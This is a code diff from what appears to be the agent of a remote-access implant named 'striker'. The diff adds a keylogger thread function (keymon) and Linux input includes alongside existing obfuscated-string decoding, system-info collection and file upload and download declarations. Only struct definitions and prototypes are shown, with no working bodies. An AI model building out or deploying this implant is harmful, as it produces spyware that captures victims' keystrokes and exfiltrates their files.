@@ -13,9 +13,12 @@
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <fcntl.h>
+#include <linux/input.h>
+#include <pthread.h>
 #include <curl/curl.h>
-#include "striker_utils.h"
 #include "cJSON.h"
+#include "striker_utils.h"
 
 /**
  * A struct for tracking session info.
@@ -30,20 +33,14 @@ typedef struct{
   char *write_dir;
 } session;
 
-/**
- * A struct for representing a single task.
- * `uid` is the task ID.
- * `type` is the task type.
- * `data` is the task data.
- * `completed` is set to true when the task is performed, regardless of result.
- * `result` is the result prepared result cJSON object that can be sent directly to the server.
- */
+// A struct for representing a single task.
 typedef struct{
-  char *uid;
-  char *type;
-  cJSON *data;
-  unsigned short completed;
-  cJSON *result;
+  char *uid; // The ID of the task
+  char *type; // The type of the task
+  cJSON *data; // The data needed by the task
+  unsigned short completed; // Indicates if the task has been completed.
+  unsigned short queued; // Indicates if the task has been queued.
+  cJSON *result; // The result of the task.
 } task;
 
 // For decoding obfuscated strings.
@@ -68,14 +65,17 @@ size_t body_downloader(void *chunk, size_t size, size_t nmemb, FILE *wfo);
 // Return a json object containing system information.
 cJSON *sysinfo();
 
-// Parse a task JSON and return it, NULL on error.
-task *parse_task(cJSON *json);
-
 // Handles task for uploading file to server. Returns 1 on success.
 short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff);
 
 // Download a file from `url` and save to `wfo`. Returns 1 on success.
 short int download_file(char *url, FILE *wfo, buffer *result_buff);
+
+// Starts a keylogger for a given duration. Called in a thread.
+void *keymon(void *ptr);
+
+// Parse a task JSON and return it, NULL on error.
+task *parse_task(cJSON *json);
 
 // Execute a task.
 void execute_task(session *striker, task *t);
